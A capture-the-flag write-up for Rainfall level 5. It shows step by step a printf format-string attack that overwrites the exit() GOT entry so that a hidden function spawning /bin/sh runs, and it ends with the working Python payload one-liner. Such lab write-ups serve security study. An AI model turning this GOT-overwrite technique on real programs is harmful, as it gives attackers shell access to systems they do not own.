# Rainfall - Level 5

## Executable Analyse

The program has 3 functions :

```assembly
(gdb) info function

0x080484a4  o
0x080484c2  n
0x08048504  main
```
The program calls `main`, which calls `n()` function.  
The goal is to execute `o` because the function call *system('/bin/sh')*  

Just like the two previous challenges, the `n` function is vulnerable to a printf attack.  

This time we have to rewrite exit() link function in the linkage table (@plt) in order to execute `o`. 

## Vulnerability

```bash
level5@RainFall:~$ ./level5 
AAAA %p %p %p %p %p %p %p %p

AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
```
Our buffer starts to write at the 4th element. Like in previous challenge we will need `%4$n`  
We can found the address of exit() link, disassembling exit function, and take `jmp` address : `0x8049838`  
```assembly
(gdb) disas exit

Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:		jmp    *0x8049838
   0x080483d6 <+6>:		push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
```
We want to store o() address (0x080484a4) at `*0x8049838`  

The n will write the n position in buffer, so hex(0x080484a4) convert to int = 134513828.  
Because of exit link address already passed we substact - 4 = 134513824  

```shell
(python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824x" + "%4$n"' ; cat) | ./level5
```